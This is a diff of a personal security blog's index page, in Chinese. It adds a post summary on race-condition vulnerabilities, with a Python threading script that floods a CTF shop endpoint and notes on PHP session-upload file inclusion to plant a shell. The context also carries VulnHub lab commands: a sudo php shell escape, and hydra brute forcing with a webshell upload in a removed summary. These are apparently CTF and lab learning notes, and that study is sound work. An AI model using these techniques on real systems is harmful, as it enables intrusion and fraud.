@@ -110,6 +110,29 @@
         alt="https://www.gravatar.com/avatar/aa99b351245441b8ca95d54a52d2998c?s=240&amp;d=mp"
         title="https://www.gravatar.com/avatar/aa99b351245441b8ca95d54a52d2998c?s=240&amp;d=mp" /></a></div><h1 class="home-title">ThnPinkman's blog</h1><div class="home-subtitle"><div id="id-1" class="typeit"></div></div><div class="links"></div></div>
 <article class="single summary" itemscope itemtype="http://schema.org/Article"><h1 class="single-title" itemprop="name headline">
+        <a href="/posts/web%E6%BC%8F%E6%B4%9E%E5%9F%BA%E7%A1%80/%E6%9D%A1%E4%BB%B6%E7%AB%9E%E4%BA%89/">条件竞争</a>
+    </h1><div class="post-meta"><span class="post-author"><a href="/" title="Author" rel=" author" class="author"><i class="fas fa-user-circle fa-fw" aria-hidden="true"></i>Author</a>
+</span>&nbsp;<span class="post-publish">published on <time datetime="2024-08-20">2024-08-20</time></span>&nbsp;<span class="post-category">included in <a href="/categories/web%E6%BC%8F%E6%B4%9E%E5%9F%BA%E7%A1%80/"><i class="far fa-folder fa-fw" aria-hidden="true"></i>Web漏洞基础</a></span></div><div class="content">前言 之前一直没有专门找时间分析条件竞争是什么，也只是浅显的认为跟文件包含有些关系，还是主要通过ctfshow的文件包含来了解的。还是有必要捋一下条件竞争这个东西。
+什么是条件竞争 看大家写的专业点的术语大概是条件竞争是指一个系统的运行结果依赖于不受控制的事件的先后顺序。当这些不受控制的事件并没有按照开发者想要的方式运行时，就可能会出现 bug。尤其在当前我们的系统中大量对资源进行共享，如果处理不当的话，就会产生条件竞争漏洞。
+通俗一点的解释也有群友在讲条件竞争 好比有人问你两句话 第一句“你有没有男朋友” 如果你回答没有 他会说第二句“现在我是你男朋友了” 但是 加入100个男人一次一次的问 你只会有一个男朋友， 100个男人同时问 只要你能同时回答100个 你就有100个男朋友了
+假设程序同时处理存钱和取钱，当取钱&quot;速度&quot;大于存钱时，可能就会出现取钱后程序还未来得及将金额减少，程序又立马处理存钱，由此产生非预期的结果
+我觉得还挺好理解的。
+例题Hgame2023 Hgame2023 中出现一道条件竞争的题目，很好的利用了这个思路
+我有10元，但是flag需要10000000000元
+可以简单粗暴地使用条件竞争,直接重复买Flag10000次，就赌服务器检查不过来
+import requests import threading def req(): url = &#39;http://week-3.hgame.lwsec.cn:31111/api/v1/user/buyProduct?product=Flag&amp;number=1&#39; headers = { &#39;Cookie&#39;:&#39;SESSION=MTY3NTE4OTc0NHxEdi1CQkFFQ180SUFBUkFCRUFBQUlfLUNBQUVHYzNSeWFXNW5EQVlBQkhWelpYSUdjM1J5YVc1bkRBY0FCV0ZrYldsdXwQnP1C-gBhrFuG-GFI2yGPc3QsG0CSUEHeRahONCVOxw==; session=MTY3NTE5MzMxMHxEdi1CQkFFQ180SUFBUkFCRUFBQUtQLUNBQUVHYzNSeWFXNW5EQW9BQ0hWelpYSnVZVzFsQm5OMGNtbHVad3dJQUFZeE1qTTBOVFk9fKDfSi3Bd18TAleiQIVGKj5Tlcxs4toyGz3e-eLGoGRV&#39; } r = requests.get(url=url, headers=headers) for i in range(10000): threading.Thread(target=req).start() 10000次 竞争，成功竞争出去了一百多次
+例题 1.文件上传+条件竞争 一般是上传文件，绕过防护之后，小马又会被立马删除。但是由于文件存在过，我们可以利用python脚本不断访问shell，这样就形成了python脚本和web删除程序之间的竞争，一定的测试量后，可以竞争到资源，执行shell，从而得到flag。
+https://co0ontty.github.io/2019/04/12/batterupload.html这个文章的例题挺清晰的
+burpsuit的攻击模块多线程不断发包，以达到我们的预期效果。
+2.session文件包含+条件竞争 这是我想学习的重点了 ,是通过ctfshow的web82来进行了解 https://www.bilibili.com/video/BV1P64y1Q72q?p=5&vd_source=cf73ac8de9b7c0322b1bccf77de91c5d先了解一下基础的前置知识：
+在cookie中设置 PHPSESSION=aaa 则会生成一个临时文件 /tmp/sess_aaa ，所以我们可控文件名
+文件内容如何控制？用PHP_SESSION_UPLOAD_PRGRESS参数
+PHP_SESSION_UPLOAD_PRGRESS参数的值为123，则 /tmp/sess_aaa的内容为123，则文件内容可控制
+由此原理我们可以写进shell然后rce
+首先通过PHP_SESSION_UPLOAD_PRGRESS在/tmp/sess_xxxx中写入一个shell</div><div class="post-footer">
+        <a href="/posts/web%E6%BC%8F%E6%B4%9E%E5%9F%BA%E7%A1%80/%E6%9D%A1%E4%BB%B6%E7%AB%9E%E4%BA%89/">Read More</a><div class="post-tags">
+                <i class="fas fa-tags fa-fw" aria-hidden="true"></i>&nbsp;<a href="/tags/%E6%9D%A1%E4%BB%B6%E7%AB%9E%E4%BA%89/">条件竞争</a></div></div>
+</article><article class="single summary" itemscope itemtype="http://schema.org/Article"><h1 class="single-title" itemprop="name headline">
         <a href="/posts/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/vulnhub--ch4inrulz_v1.0.1/">VulnHub — CH4INRULZ_v1.0.1</a>
     </h1><div class="post-meta"><span class="post-author"><a href="/" title="Author" rel=" author" class="author"><i class="fas fa-user-circle fa-fw" aria-hidden="true"></i>Author</a>
 </span>&nbsp;<span class="post-publish">published on <time datetime="2024-08-19">2024-08-19</time></span>&nbsp;<span class="post-category">included in <a href="/categories/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/"><i class="far fa-folder fa-fw" aria-hidden="true"></i>内网渗透</a></span></div><div class="content">VulnHub — CH4INRULZ_v1.0.1 扫描ip和端口 nmap 192.168.164.0/24 可以用dirb 扫描.bak备份文件 dirb http://192.168.164.137/ -x .bak curl直接读文件
@@ -184,16 +207,6 @@ php 回调bash提权 sudo php -r &#39;system(&#34;/bin/bash&#34;);&#39; 权限 
 进入 发现有flag 但是没有权限查看 还有一个password MD5加密的 可以读取到 这个md5直接拿去解密</div><div class="post-footer">
         <a href="/posts/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/vulnhub--mrrobot1/">Read More</a><div class="post-tags">
                 <i class="fas fa-tags fa-fw" aria-hidden="true"></i>&nbsp;<a href="/tags/">Tags</a></div></div>
-</article><article class="single summary" itemscope itemtype="http://schema.org/Article"><h1 class="single-title" itemprop="name headline">
-        <a href="/posts/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/vulnhub--narak/">VulnHub — NARAK</a>
-    </h1><div class="post-meta"><span class="post-author"><a href="/" title="Author" rel=" author" class="author"><i class="fas fa-user-circle fa-fw" aria-hidden="true"></i>Author</a>
-</span>&nbsp;<span class="post-publish">published on <time datetime="2024-08-19">2024-08-19</time></span>&nbsp;<span class="post-category">included in <a href="/categories/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/"><i class="far fa-folder fa-fw" aria-hidden="true"></i>内网渗透</a></span></div><div class="content">VulnHub — NARAK Objective: Find 2 flags (user.txt and root.txt)
-nmap 扫出来靶场ip 和开放端口 浏览器访问 ，一堆这个关于题目背景的地狱图片 ，没有什么信息
-扫描一下目录 ，dirsearch 和 dirb都用了一下 ，dirmap倒是没出来
-访问webdav 有东西 **cadaver —— webdav客户端使用 ** cadaver http://192.168.164.130/webdav //连接put webshell.php //上传 cewl —— 爬行网站创建密码字典 通过爬取网站获得关键词信息，创建一个密码字典cewl http://192.168.164.130/ -w 1.txt hydra —— 爆破神器，支持众多协议的自动化爆破 hydra -L 1.txt -P 1.txt 192.168.164.130 http-get /webdav -L 用户名 -P 密码 ip地址 协议 路径 爆破出 用户名密码了，就可以cadaver 进行连接了 连接上，可以 put 一个 webshell ，成功后
-nc ——监听 nc -lvvp 4444(webshell设置端口) 然后用刚才的用户名密码 登录这个webshell</div><div class="post-footer">
-        <a href="/posts/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/vulnhub--narak/">Read More</a><div class="post-tags">
-                <i class="fas fa-tags fa-fw" aria-hidden="true"></i>&nbsp;<a href="/tags/">Tags</a></div></div>
 </article><ul class="pagination"><li class="page-item ">
                     <span class="page-link">
                         <a href="/">1</a>
@@ -212,10 +225,14 @@ nc ——监听 nc -lvvp 4444(webshell设置端口) 然后用刚才的用户名�
                     <span class="page-link">
                         <a href="/page/11/">11</a>
                     </span>
+                </li><li class="page-item ">
+                    <span class="page-link">
+                        <a href="/page/12/">12</a>
+                    </span>
                 </li></ul></div></div>
             </main><footer class="footer">
         <div class="footer-container"><div class="footer-line">Powered by <a href="https://gohugo.io/" target="_blank" rel="noopener noreffer" title="Hugo 0.133.0">Hugo</a> | Theme - <a href="https://github.com/Fastbyte01/KeepIt" target="_blank" rel="noopener noreffer" title="KeepIt 0.2.10"><i class="far fa-kiss-wink-heart fa-fw" aria-hidden="true"></i> KeepIt</a>
-                </div><div class="footer-line" itemscope itemtype="http://schema.org/CreativeWork"><i class="far fa-copyright fa-fw" aria-hidden="true"></i><span itemprop="copyrightYear">2022 - 2024</span><span class="author" itemprop="copyrightHolder">&nbsp;<a href="/" target="_blank"></a></span></div>
+                </div><div class="footer-line" itemscope itemtype="http://schema.org/CreativeWork"><i class="far fa-copyright fa-fw" aria-hidden="true"></i><span itemprop="copyrightYear">2022 - 2025</span><span class="author" itemprop="copyrightHolder">&nbsp;<a href="/" target="_blank"></a></span></div>
         </div>
     </footer></div>
 
